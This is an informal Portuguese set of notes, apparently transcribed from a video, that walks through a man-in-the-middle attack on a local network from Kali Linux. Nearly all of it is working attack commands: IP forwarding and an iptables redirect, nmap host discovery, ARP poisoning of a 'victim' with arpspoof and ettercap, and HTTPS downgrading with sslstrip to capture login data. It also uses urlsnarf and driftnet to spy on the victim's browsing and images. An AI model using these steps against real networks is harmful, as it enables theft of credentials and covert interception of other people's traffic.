kali usado 1- no diretório root@kali~# apenas

ifconfig

selecione uma interface no video ele usa eth0(cabo)
mas testaremos com wlan0 depois... inicialmente vamos tentar eth0
Ja esteja conectado a iternet antes de iniciar o ataque.

no mesmo terminal

echo 1 > /proc/sys/net/ipv4/ip_forward

iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000

route -n

copie o ip abaixo da palavra gateway

nmap -sS -O ipcopiado/24 ou nmap -T4 -A -v ipgateway(0-255)

observar se após o scan a primeira ocorrencia do item exibe "nmap scan report for ipcopiado"
e o observar também se o segundo item do nmap scan report exibe o ip de uma segunda maquina 
além da própria gateway. Se sim copie este ip do segundo item (suspeito que seja o ipalvo)

clear

arpspoof -i <interface> -t ipalvo ipgatewy
(tem que ficar descendo umas letras contendo macs de ambos is-at
e 0806 arp reply) 

ctrl+shift+n

sslstrip -l 10000

Maquina vítima

nesse momento abrir o navegador...
observar os endereços de sites https mudando para http...
ver também se ouver problema mudar o navegador...

observe a movimentação do segundo terminal do ssl

veja os resultados novo terminal
ctrl+shift+n

cat sslstrip.log

esse ultimo comando acima testa se o navegdor esta vulnerável
se estiver mostra os dados de login ou até de navegação...
caso não mostra que esta tudo criptografado.

sysctl -w net.ipv4.ip_forward-1

ettercap assume....

urlsnarf -i wlan0 (mostra os sites que estao sendo acessados pela vitima)

driftnet -i wlan0 -d /home/user/Desktop/ -vv 
(Exibe imagens, para salvar clique duas vezes na imagem da janela)

ettercap -T -q -i wlan0 -M arp:remote /gateway/ /vitima/ (ou // // toda rede)


FONTE: https://www.youtube.com/watch?v=3RzpdkwuAZo

SSLSTRIP 2.0

https://www.guiadoti.com/2017/09/sslstrip-2-0-hsts-bypass/



